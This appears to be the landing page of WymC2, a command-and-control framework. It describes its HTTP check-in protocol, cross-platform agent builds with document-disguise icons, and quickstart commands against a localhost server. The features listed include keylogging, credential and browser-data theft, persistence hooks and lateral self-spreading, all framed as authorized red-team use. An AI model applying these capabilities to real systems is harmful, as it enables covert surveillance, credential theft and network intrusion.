What it is

Plain HTTP / JSON wire

Every agent — script or compiled — speaks the same protocol over plain HTTP/JSON: register → checkin → tasks → result. A single spec keeps 16 language implementations interoperable with zero extra dependencies.

Persistent identity, graceful recovery

Agents persist their id and re-register on a 404. Lost server-side records never brick the fleet; unacknowledged tasks are re-sent, so handlers stay idempotent.

Outbound-only, NAT friendly

Jittered heartbeats plus per-task timeouts keep the channel client-initiated. The server never needs to reach you.

Server-side cross-compile

Build compiled agents straight from the dashboard — Go, Rust, C, C++, C#, Java — targeting win_x64, win_x86, linux_x64, linux_arm64, macos_x64, macos_arm64. Deterministic artifacts: wym_<lang>_<os>_<arch>.<ext>. Mobile packages too: Android .apk and iOS .ipa.

Operator capabilities

shell

Run commands through the platform shell with a per-task timeout (default 120s).

download / upload

Push staged files to an agent, or pull files back into the server's Collected store.

keylog

Start / stop / dump a background keystroke logger (platform-dependent; not on macOS).

sleep

Change the heartbeat interval on the fly.

persistence

Install logon / reboot / cron / systemd hooks that relaunch the agent with the same flags.

steal

Collect env vars, credential / token files and raw browser databases, then zip + upload as steal.zip.

clone

Become a watcher that polls a target's liveness and relaunches it when stale or dead.

clipboard

Read or write the clipboard with OS-native tooling per platform.

screenshot

Capture and upload a PNG snapshot.

lateral

Discover LAN peers via arp -a / ip neigh, then best-effort copy + launch this agent on each.

web terminal

Drive the server host through an xterm.js terminal over WebSocket.

multi-user

PBKDF2-hashed dashboard accounts, server-side sessions, CSRF protection and shared agent tokens.

Build & deploy

Cross-compile from the dashboard

Pick a compiled language and target in Generate Agent; the server builds on the fly and streams the binary for download. Toolchains are detected at install time.

Deterministic artifacts

Every build is named wym_<lang>_<os>_<arch>.<ext> and cached behind a source hash — unchanged sources never recompile.

Mobile builds (APK / IPA)

Android wym_android.apk via Gradle + Android SDK, iOS wym_ios.ipa via the MobAI ios-builder CLI on any OS (macOS can fall back to xcrun). Custom artifact name + disguise icon (PDF/DOCX/XLSX/PPTX/ZIP/RAR) per build; a missing toolchain fails fast with a clear message.

Runtime bundles

Windows C/C++/Rust builds ship with their runtime DLLs; Java compiles to an executable jar (wym_java_<os>_<arch>.jar) tuned for --release 11, so it runs on any JRE 9+.

Platform-aware targets

Targets are validated against the platform: C# binaries build only for Windows (wym_csharp_win_x64.exe / wym_csharp_win_x86.exe).

Service installers

agent-service.ps1 and agent-service.sh turn any source into a Windows scheduled task / sc service, systemd or cron unit — persistence-ready but opt-in.

Build log & health

Compiles stream live logs to the dashboard, report duration and consume a sticky cache — an artifact status icon turns green only when the invoked toolchain exits 0.

The wire protocol

01 · Register

Agent posts its fingerprint; the server issues a persistent agent_id.

02 · Check in

Heartbeat every interval ± jitter; server queues any pending tasks.

03 · Execute

Agent runs the task, bounded by its per-task timeout.

04 · Report

Result (output, exit code, error) is posted and acknowledged server-side.

POST /api/register — hostname, username, os, arch, pid, ip, type, version → agent_id (persist it)
POST /api/checkin — {agent_id} every interval ± jitter → {tasks: [...]}
POST /api/result — task_id, output, exit_code, optional error → ack; unacked are re-sent
404 on checkin — the id was lost server-side → re-register automatically

Full spec: PROTOCOL.md · agent guide: AGENTS.md · build & run: DEVELOPMENT.md

Quickstart

$ git clone https://github.com/adyoi/WymC2
$ cd WymC2

# Windows — install the dashboard + agent service
$ powershell -ExecutionPolicy Bypass -File install.ps1

# Linux / macOS
$ bash install.sh
# Run an agent against your server (any supported runtime)
$ cd clients
$ python agent.py  --server http://127.0.0.1:8000 --token YOUR_AGENT_TOKEN
$ node   agent.js  --server http://127.0.0.1:8000 --token YOUR_AGENT_TOKEN
$ go run agent.go clone_windows.go keylog_windows.go --server http://127.0.0.1:8000 --token YOUR_AGENT_TOKEN # (Linux: clone_unix.go keylog_linux.go · macOS: keylog_darwin.go)

# Flags have env-var fallbacks:  WYM_SERVER WYM_TOKEN WYM_INTERVAL WYM_JITTER WYM_STATE_FILE WYM_VERBOSE
$ WYM_SERVER=http://127.0.0.1:8000 WYM_TOKEN=YOUR_AGENT_TOKEN python agent.py
Env varFlagFallback notes
WYM_SERVER--serverbase URL of the server
WYM_TOKEN--tokenshared agent token
WYM_INTERVAL--intervalheartbeat interval in seconds
WYM_JITTER--jittermax random jitter added to the interval
WYM_STATE_FILE--stateJSON state path (default ~/.wymagent.json)
WYM_VERBOSE--verboseset to 1 or true
Authorized use only. This is a dual-use security framework. Use it exclusively against systems you own or with explicit written authorization. It ships no evasion and no stealth — plain HTTP, plaintext-friendly wire format — and operators opt into persistence, lateral, keylog and steal tasks.
